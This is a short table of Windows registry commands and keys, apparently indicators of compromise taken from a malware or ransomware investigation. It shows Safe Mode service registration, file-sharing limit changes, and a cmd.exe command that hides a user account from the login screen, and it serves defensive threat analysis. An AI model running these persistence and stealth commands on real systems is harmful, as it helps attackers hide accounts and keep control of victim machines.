| COMMAND | DESCRIPTION |
|--------------------------------------------|--------------------------------------------------------------------------------------|
| REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\mXoRpcSsx /VE /T REG_SZ /F /D Service | Registry modification for Safe Mode services |
| REG QUERY HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions | Checks system startup settings in the registry |
| REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\VSS /VE /T REG_SZ /F /D Service | Related to VSS in the context of Windows minimal boot (Safe Mode) |
| HKLM\SOFTWARE\Microsoft\Windows Media Player NSS\3.0\Servers\D8B548F0-E306-4B2B-BD82-25DAC3208786\(malicious_server) | Used to store settings and information related to system and software. Appears to be related to server or device configuration associated with WMP - server name may be available |
| HKU\S-1-5-21-4270068108-2931534202-3907561125-1001\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{ED50FC29-B964-48A9-AFB3-15EBB9B97F36} {ADD8BA80-002B-11D0-8F0F-00C04FD7D062} 0xFFFF | Used to retrieve some type of Shell in the Operating System |
| reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f | Configures registry value entry to set the maximum MPX count limit for the LanmanServer service to 65535. MaxMpxCt value is related to client x server communication in file sharing |
| cmd.exe /Q /c reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /t REG_DWORD /v [USER] /d 0 /f 1> \\127.0.0.1\ADMIN$\__[TIMESTAMP] 2>&1 | Hide user from Windows Login screen |
